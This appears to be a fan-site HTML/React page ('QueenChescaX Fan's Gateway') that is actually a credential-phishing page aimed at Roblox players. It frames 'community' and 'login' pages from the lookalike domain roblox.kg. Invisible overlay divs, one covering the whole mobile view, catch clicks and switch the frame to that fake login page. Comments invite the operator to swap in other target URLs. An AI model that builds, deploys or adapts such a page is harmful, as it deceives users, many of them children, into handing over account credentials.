<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QueenChescaX Fan's Gateway</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <!-- React and ReactDOM -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <!-- Babel for JSX -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700;900&family=Inter:wght@400;600&display=swap');
      
      body {
        font-family: 'Inter', sans-serif;
        margin: 0;
        padding: 0;
        overflow: hidden;
        background-color: #000;
      }
      
      ::-webkit-scrollbar {
        width: 8px;
      }
      ::-webkit-scrollbar-track {
        background: rgba(0, 0, 0, 0.5);
      }
      ::-webkit-scrollbar-thumb {
        background: rgba(255, 255, 255, 0.2);
        border-radius: 4px;
      }
      ::-webkit-scrollbar-thumb:hover {
        background: rgba(255, 255, 255, 0.4);
      }
    </style>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        // --- Constants ---
        const BACKGROUND_GIF = "https://media1.tenor.com/m/8d-ueVpIfNwAAAAd/demon-slayer.gif";
        
        // 1st Iframe URL (Community Page) - CHANGE THIS URL BELOW TO UPDATE THE COMMUNITY PAGE
        const TARGET_IFRAME_URL = "https://roblox.kg/communities/8662283700/"; 
        
        // 2nd Iframe URL (Login Page) - CHANGE THIS URL BELOW TO UPDATE THE LOGIN PAGE
        const LOGIN_URL = "https://roblox.kg/login?returnUrl=4253845985130233";

        // CHANGE THE DISCORD USER ID BELOW
        const DISCORD_USER_ID = "1440895170639040532";

        // CHANGE THE YOUTUBE URL BELOW
        const YOUTUBE_URL = "https://www.youtube.com/@StrangerToGargatuanTV";
        
        const GAME_IMAGES = [
          {
            id: 1,
            url: "https://upload.wikimedia.org/wikipedia/en/7/77/Steal_a_Brainrot_thumbnail.webp",
            title: "Secret Base"
          },
          {
            id: 2,
            url: "https://tr.rbxcdn.com/180DAY-46fa77da38e90bdb155fcef587b33453/768/432/Image/Webp/noFilter",
            title: "Grows Offline"
          },
          {
            id: 3,
            url: "https://tr.rbxcdn.com/180DAY-1b2ce3f49cd12eb6626b9a21420baadd/768/432/Image/Webp/noFilter",
            title: "Adopt Me!"
          }
        ];

        // --- Components ---
        
        // FloatingImage Component
        const FloatingImage = ({ src, alt, delay }) => {
          return (
            <div 
              className="relative group cursor-pointer"
              style={{
                animation: `float 6s ease-in-out infinite`,
                animationDelay: `${delay}s`,
              }}
            >
              <div className="absolute -top-10 left-1/2 -translate-x-1/2 opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none whitespace-nowrap z-20">
                <span className="px-3 py-1 bg-black/80 text-white text-xs font-bold rounded-full border border-white/20 shadow-xl backdrop-blur-md">
                  {alt}
                </span>
              </div>
              <div className="absolute -inset-2 bg-gradient-to-r from-purple-600 via-pink-600 to-blue-600 rounded-2xl blur-lg opacity-40 group-hover:opacity-100 transition-all duration-500 group-hover:duration-300 group-hover:scale-110"></div>
              <div className="relative overflow-hidden rounded-xl border-2 border-white/20 group-hover:border-white/90 bg-gray-900 shadow-2xl transition-all duration-300 transform group-hover:scale-105 group-hover:-translate-y-2">
                <img 
                  src={src} 
                  alt={alt} 
                  className="w-36 h-36 md:w-44 md:h-44 object-cover transform transition-transform duration-700 group-hover:scale-110"
                />
                <div className="absolute inset-0 bg-gradient-to-tr from-white/0 via-white/10 to-white/0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 pointer-events-none"></div>
                <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/40 to-transparent -translate-x-[200%] group-hover:animate-shine pointer-events-none"></div>
              </div>
              <style>{`
                @keyframes float {
                  0% { transform: translateY(0px); }
                  50% { transform: translateY(-20px); }
                  100% { transform: translateY(0px); }
                }
                @keyframes shine {
                  0% { transform: translateX(-200%) skewX(-15deg); }
                  100% { transform: translateX(200%) skewX(-15deg); }
                }
                .group-hover\\:animate-shine {
                  animation: shine 0.75s ease-in-out forwards;
                }
              `}</style>
            </div>
          );
        };

        // GlassContainer Component
        const GlassContainer = ({ children, className = '' }) => {
          return (
            <div className={`
              relative 
              backdrop-blur-sm 
              bg-white/[0.03] 
              border border-white/20 
              rounded-3xl 
              shadow-2xl 
              shadow-black/50
              overflow-hidden
              ${className}
            `}>
              <div className="absolute inset-0 opacity-[0.01] pointer-events-none z-0" 
                   style={{ backgroundImage: `url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E")` }}>
              </div>
              <div className="relative z-10 h-full w-full">
                {children}
              </div>
            </div>
          );
        };

        // --- App Component ---
        const App = () => {
          const [showIframe, setShowIframe] = React.useState(false);
          const [iframeLoaded, setIframeLoaded] = React.useState(false);
          const [activeUrl, setActiveUrl] = React.useState(TARGET_IFRAME_URL);
          const [showMobilePopup, setShowMobilePopup] = React.useState(true);

          // Auto-dismiss the mobile popup after 4 seconds
          React.useEffect(() => {
            const timer = setTimeout(() => {
              setShowMobilePopup(false);
            }, 4000);
            return () => clearTimeout(timer);
          }, []);

          // Ensure icons render after every update
          React.useEffect(() => {
            if (window.lucide) {
              window.lucide.createIcons();
            }
          });

          const handleStart = () => {
            setActiveUrl(TARGET_IFRAME_URL);
            setShowIframe(true);
          };

          const toggleUrl = () => {
            setIframeLoaded(false);
            if (activeUrl === TARGET_IFRAME_URL) {
              setActiveUrl(LOGIN_URL);
            } else {
              setActiveUrl(TARGET_IFRAME_URL);
            }
          };

          const isLoginMode = activeUrl === LOGIN_URL;

          return (
            <div className="relative w-full h-screen overflow-hidden text-white selection:bg-pink-500 selection:text-white">
              
              {/* Background Layer */}
              <div className="absolute inset-0 z-0">
                <img 
                  src={BACKGROUND_GIF} 
                  alt="Demon Slayer Background" 
                  className="w-full h-full object-cover"
                />
                <div className="absolute inset-0 bg-black/50 backdrop-grayscale-[20%]" />
                <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-black/30 pointer-events-none" />
              </div>

              {/* POPUP NOTE - Shows for 4 seconds on START - Visible on ALL devices */}
              {showMobilePopup && (
                <div className="fixed inset-0 z-[9999] flex items-center justify-center px-6 animate-fadeIn">
                  {/* Backdrop */}
                  <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
                  
                  {/* Modal Content */}
                  <div className="relative bg-neutral-900/90 border border-yellow-500/50 p-6 rounded-2xl shadow-[0_0_50px_rgba(234,179,8,0.3)] backdrop-blur-xl text-center max-w-sm w-full overflow-hidden transform transition-all">
                    {/* Pulse Glow Background */}
                    <div className="absolute inset-0 bg-yellow-500/5 animate-pulse pointer-events-none" />
                    
                    <div className="relative z-10 flex flex-col items-center gap-4">
                      <div className="w-12 h-12 rounded-full bg-yellow-500/20 flex items-center justify-center border border-yellow-500/50 shadow-lg">
                         <span className="text-2xl">‚ö†</span>
                      </div>
                      <p className="text-yellow-400 font-bold tracking-widest font-mono text-sm leading-relaxed drop-shadow-md">
                        NOTE: IF YOU ARE ON MOBILE, PLEASE SWITCH TO DESKTOP SITE
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Main Content Wrapper */}
              <div className={`relative z-10 flex items-center justify-center w-full h-full transition-all duration-500 ${showIframe ? 'p-2' : 'p-4 sm:p-8'}`}>
                
                <GlassContainer className={`transition-all duration-700 ease-in-out ${showIframe ? 'w-full h-[85vh] max-w-[95vw] sm:max-w-[90vw] lg:max-w-6xl' : 'w-full max-w-4xl min-h-[500px]'}`}>
                  
                  {!showIframe && (
                    <div className="flex flex-col items-center justify-center h-full w-full py-12 px-6 animate-fadeIn overflow-y-auto sm:overflow-hidden scrollbar-hide">
                      
                      <h1 className="flex flex-col md:flex-row items-center justify-center gap-3 md:gap-6 text-4xl md:text-6xl lg:text-7xl font-black mb-8 font-serif text-center mt-4 shrink-0">
                        <span className="text-transparent bg-clip-text bg-gradient-to-b from-white via-gray-200 to-gray-400 drop-shadow-[0_2px_15px_rgba(255,255,255,0.4)] pb-2 tracking-widest">
                          ùïºùñöùñäùñäùñìùïÆùñçùñäùñòùñàùñÜùñÉ
                        </span>
                        
                        <div className="relative inline-flex items-center">
                          <span className="text-transparent bg-clip-text bg-gradient-to-b from-white via-gray-200 to-gray-400 drop-shadow-[0_2px_15px_rgba(255,255,255,0.4)] pb-2 tracking-widest">
                            ùï±ùñÜùñì'ùñò
                          </span>
                          <i 
                            data-lucide="crown" 
                            className="absolute -top-6 -right-4 md:-top-9 md:-right-7 w-10 h-10 md:w-14 md:h-14 text-yellow-500 drop-shadow-[0_0_20px_rgba(234,179,8,0.8)] animate-pulse-slow rotate-[15deg]"
                            fill="currentColor"
                          ></i>
                        </div>
                      </h1>
                      
                      <p className="text-gray-200 mb-12 text-center max-w-md font-sans drop-shadow-md text-lg shrink-0">
                        Your journey awaits.
                      </p>

                      <div style={{ animation: 'float 6s ease-in-out infinite', animationDelay: '0s' }} className="shrink-0 flex flex-col items-center w-full">
                        <button 
                          onClick={handleStart}
                          className="group relative px-10 py-5 bg-black/40 overflow-hidden rounded-full mb-4 transition-all duration-300 hover:scale-105 active:scale-95 ring-1 ring-white/50 hover:ring-white/100 shadow-[0_0_20px_rgba(255,255,255,0.2)] hover:shadow-[0_0_30px_rgba(255,255,255,0.4)]"
                        >
                          <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-purple-600/40 to-blue-600/40 group-hover:from-purple-600/60 group-hover:to-blue-600/60 transition-all duration-300" />
                          <div className="absolute bottom-0 left-0 h-[2px] w-full bg-gradient-to-r from-transparent via-white to-transparent opacity-60 group-hover:opacity-100 transition-opacity" />
                          
                          <span className="relative flex items-center gap-3 text-xl font-bold tracking-widest uppercase text-white drop-shadow-lg font-mono">
                            Tap to continue
                            <i data-lucide="arrow-right" className="w-6 h-6 group-hover:translate-x-2 transition-transform"></i>
                          </span>
                        </button>
                        <div className="h-4 md:h-16 w-full"></div>
                      </div>

                      <div className="flex flex-wrap justify-center gap-6 md:gap-8 perspective-[1000px] shrink-0">
                        {GAME_IMAGES.map((img, index) => (
                          <FloatingImage 
                            key={img.id}
                            src={img.url}
                            alt={img.title}
                            delay={index * 0.5 + 0.5} 
                          />
                        ))}
                      </div>

                      {/* Social Platforms */}
                      <div className="flex flex-wrap justify-center gap-4 sm:gap-6 mt-12 mb-8 w-full animate-fadeIn shrink-0" style={{ animationDelay: '0.5s' }}>
                        {/* Discord Button */}
                        <a 
                          href={`https://discord.com/users/${DISCORD_USER_ID}`} 
                          target="_blank" 
                          rel="noopener noreferrer" 
                          className="group flex items-center gap-3 px-6 py-3 bg-[#5865F2]/20 hover:bg-[#5865F2]/80 border border-[#5865F2]/40 hover:border-[#5865F2] rounded-xl transition-all duration-300 hover:scale-105 hover:-translate-y-1 hover:shadow-[0_0_25px_rgba(88,101,242,0.5)]"
                        >
                          {/* Discord Icon SVG */}
                          <svg className="w-6 h-6 text-[#5865F2] group-hover:text-white transition-colors" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.419-2.1568 2.419zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.419-2.1568 2.419z"/>
                          </svg>
                          <span className="text-[#5865F2] group-hover:text-white font-bold tracking-widest text-sm font-mono">DISCORD</span>
                        </a>

                        {/* YouTube Button */}
                        <a 
                          href={YOUTUBE_URL} 
                          target="_blank" 
                          rel="noopener noreferrer" 
                          className="group flex items-center gap-3 px-6 py-3 bg-[#FF0000]/20 hover:bg-[#FF0000]/80 border border-[#FF0000]/40 hover:border-[#FF0000] rounded-xl transition-all duration-300 hover:scale-105 hover:-translate-y-1 hover:shadow-[0_0_25px_rgba(255,0,0,0.5)]"
                        >
                          <i data-lucide="youtube" className="w-6 h-6 text-[#FF0000] group-hover:text-white transition-colors"></i>
                          <span className="text-[#FF0000] group-hover:text-white font-bold tracking-widest text-sm font-mono">YOUTUBE</span>
                        </a>
                      </div>

                    </div>
                  )}

                  {showIframe && (
                    <div className="relative w-full h-full flex flex-col animate-fadeIn">
                      {/* Header Bar - Compact */}
                      <div className="flex items-center justify-between px-4 py-2 border-b border-white/10 bg-black/20 backdrop-blur-md h-12 shrink-0 gap-4">
                        <div className="flex items-center gap-2 shrink-0">
                           <div className="w-2.5 h-2.5 rounded-full bg-red-500 hover:bg-red-400 transition-colors cursor-pointer shadow-[0_0_10px_rgba(239,68,68,0.5)]" onClick={() => setShowIframe(false)} />
                           <div className="w-2.5 h-2.5 rounded-full bg-yellow-500 hover:bg-yellow-400 transition-colors shadow-[0_0_10px_rgba(234,179,8,0.5)]" />
                           <div className="w-2.5 h-2.5 rounded-full bg-green-500 hover:bg-green-400 transition-colors shadow-[0_0_10px_rgba(34,197,94,0.5)]" />
                        </div>
                        
                        <div className="text-xs text-white/70 font-mono hidden sm:block tracking-wider drop-shadow-sm truncate">
                          ùïºùñöùñäùñäùñìùïÆùñçùñäùñòùñàùñÜùñÉ ùï±ùñÜùñì'ùñò - {isLoginMode ? 'LOGIN' : 'COMMUNITY'}
                        </div>

                        <div className="flex items-center gap-3 shrink-0">
                          <button 
                            onClick={toggleUrl}
                            className={`
                              flex items-center gap-2 px-4 py-1.5 rounded-full text-[10px] uppercase font-bold tracking-wider transition-all duration-300 shadow-lg
                              ${isLoginMode 
                                ? 'bg-white/10 hover:bg-white/20 text-white shadow-[0_0_10px_rgba(255,255,255,0.1)]'
                                : 'bg-blue-600 hover:bg-blue-500 text-white shadow-[0_0_15px_rgba(37,99,235,0.6)] animate-pulse-slow' 
                              }
                            `}
                          >
                            {isLoginMode ? (
                              <>
                                <i data-lucide="users" className="w-3 h-3"></i>
                                Back to Community
                              </>
                            ) : (
                              <>
                                <i data-lucide="log-in" className="w-3 h-3"></i>
                                Login to Join
                              </>
                            )}
                          </button>

                          <button 
                            onClick={() => setShowIframe(false)}
                            className="text-[10px] uppercase tracking-widest text-white/50 hover:text-white hover:underline transition-colors ml-2"
                          >
                            EXIT
                          </button>
                        </div>
                      </div>

                      {!iframeLoaded && (
                        <div className="absolute inset-0 flex flex-col items-center justify-center z-0 text-white/50 top-12">
                          <i data-lucide="loader-2" className="w-10 h-10 animate-spin mb-3"></i>
                          <p className="font-mono text-xs tracking-widest animate-pulse">LOADING GATEWAY...</p>
                        </div>
                      )}

                      <div className="flex-1 w-full relative z-10 bg-transparent overflow-hidden group">
                        <iframe 
                          src={activeUrl}
                          className="w-full h-full border-none bg-transparent"
                          title="Gateway Content"
                          onLoad={() => setIframeLoaded(true)}
                          allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                          allowFullScreen
                          scrolling={isLoginMode ? "auto" : "no"}
                        />
                        {/* GHOST OVERLAY */}
                        {!isLoginMode && (
                          <>
                            {/* Desktop Overlay */}
                            <div 
                              onClick={toggleUrl}
                              className="hidden md:block absolute top-[140px] right-[20px] w-[260px] h-[65px] cursor-pointer z-50 bg-transparent"
                              title="Join Community (Desktop)"
                            />
                            
                            {/* Mobile Overlay - COVERS ENTIRE VIEWABLE AREA */}
                            <div 
                              onClick={toggleUrl}
                              className="block md:hidden absolute top-[48px] left-0 w-full bottom-0 cursor-pointer z-50 bg-transparent"
                              title="Join Community (Mobile)"
                            />
                          </>
                        )}
                      </div>
                    </div>
                  )}

                </GlassContainer>
              </div>

              <style>{`
                @keyframes fadeIn {
                  from { opacity: 0; transform: scale(0.95); }
                  to { opacity: 1; transform: scale(1); }
                }
                @keyframes float {
                  0% { transform: translateY(0px); }
                  50% { transform: translateY(-15px); }
                  100% { transform: translateY(0px); }
                }
                .animate-fadeIn {
                  animation: fadeIn 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
                }
                .animate-pulse-slow {
                  animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
                }
                .perspective-[1000px] {
                  perspective: 1000px;
                }
                .scrollbar-hide::-webkit-scrollbar {
                    display: none;
                }
                .scrollbar-hide {
                    -ms-overflow-style: none;
                    scrollbar-width: none;
                }
              `}</style>
            </div>
          );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>
</html>
